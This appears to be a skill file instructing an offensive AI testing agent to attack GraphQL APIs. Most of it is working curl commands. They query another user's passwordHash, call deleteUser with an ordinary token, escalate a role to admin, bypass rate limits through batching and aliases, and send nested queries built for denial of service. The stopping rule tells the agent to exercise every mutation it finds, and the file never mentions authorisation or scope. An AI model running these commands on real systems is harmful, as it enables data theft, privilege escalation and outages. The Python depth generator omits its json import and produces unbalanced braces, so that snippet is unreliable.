---
name: graphql-api-security
description: GraphQL API security testing covering introspection, field-level authorization, BOLA/BFLA, batching abuse, depth/complexity attacks, mutations, and subscriptions
intent: offensive
---

# GraphQL API Security

## Purpose
Comprehensive GraphQL API testing: schema intelligence, authorization bypass, resource consumption, and mutation abuse.

## Preconditions
- A GraphQL endpoint has been identified (POST to /graphql or similar)
- At least one valid session (for authenticated queries)

## Attack Surface Signals
- POST to /graphql, /query, /api/graphql, /v1/graphql
- JSON responses with `data`/`errors` structure
- Apollo/Relay/urql client libraries in JavaScript
- `Content-Type: application/json` with `query` in the body

## Methodology

### Endpoint Discovery
```bash
for path in graphql graphql/v1 api/graphql query gql; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "https://TARGET/$path" \
    -H "Content-Type: application/json" -d '{"query":"{__typename}"}')
  [ "$code" = "200" ] && echo "[GRAPHQL] /$path"
done
```

### Introspection (Reconnaissance, NOT a standalone vulnerability)
```bash
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}' | jq .
```

Introspection is attack-surface intelligence. Report it only when combined with a separately confirmed access-control or data-exposure issue. If introspection reveals admin-only types or mutation names, use them for BOLA/BFLA testing below.

### BOLA (Object-Level Authorization)
```bash
# Query for another user's data by ID
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -d '{"query":"{user(id:\\"USER_B_ID\\"){email role passwordHash}}"}'
```

### BFLA (Function-Level Authorization)
```bash
# Try admin-only mutations with a regular user token
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"mutation{deleteUser(id:\\"123\\"){success}}"}'
```

### Field-Level Authorization
```bash
# Request sensitive fields that may not be field-level protected
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{me{id email role ssn apiKey internalNotes deletedAt}}"}'
```

### Query Depth / Complexity (Resource Consumption)
```bash
# Deeply nested query — generate with Python
python3 -c "
depth = 50
query = '{user{' + 'friends{' * depth + 'id' + '}}' * depth + '}}'
print(json.dumps({'query': query}))
"
```

**IMPORTANT**: Query depth alone is NOT a vulnerability. A finding requires demonstrating that the depth causes measurable resource impact (timeout, memory, denial of service to other users). Record the depth, the response time, and compare against the baseline.

### Batching Abuse
```bash
# Send multiple queries in one request (bypasses per-request rate limiting)
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"},{"query":"{user(id:3){email}}"}]'
```

### Alias Abuse
```bash
# Use aliases to query the same field many times in one request
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{a1:user(id:1){email} a2:user(id:2){email} a3:user(id:3){email}}"}'
```

### Mutation Testing
```bash
# Test mutations for missing input validation
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(id:1,input:{role:\\"admin\\"}){id role}}"}'
```

### Subscriptions / WebSocket
```bash
# Check for WebSocket-based subscriptions
# These may have different auth than HTTP queries
curl -sk -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://TARGET/graphql" --max-time 5
```

### Error Message Intelligence
```bash
# Send malformed queries — errors reveal field names
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{nonexistentField}"}' | jq .errors
```

## Evidence Contract

- **BOLA**: User A receives User B's actual data via GraphQL query
- **BFLA**: Low-privilege user executes an admin-only mutation successfully
- **Field-level auth**: Restricted field value is returned to unauthorized caller
- **Resource consumption**: Depth/batch query causes measurable service impact (timeout, error, other-user DoS)
- **NOT evidence**: Introspection enabled alone, query depth > N without impact, a field name in the schema

## Common Misses
- GET vs POST GraphQL (GET requests may have different auth)
- Persisted queries (APQ) that bypass introspection restrictions
- GraphQL over WebSocket with different auth
- Content-type variants (application/graphql vs application/json)
- Subscription resolvers with weaker auth than queries
- Custom directives that may leak information

## False Positives / Non-Findings
- Introspection enabled on a public API with no sensitive data
- Deep queries that execute fine with no measurable impact
- Field suggestions in error messages (recon, not a vuln)
- Batching that is properly rate-limited per operation

## Xalgorix Tool Strategy
- `terminal_execute` with curl for precise query construction
- Python for generating deep/complex queries programmatically
- `authz_matrix` for cross-role GraphQL differential

## Stopping Rule
Exhaust every type, field, and mutation discovered via introspection. Test read and write paths. Test batching and depth impact.

## Handoff
Report each confirmed GraphQL issue with the query used, the authorization context, and the concrete unauthorized data/action.
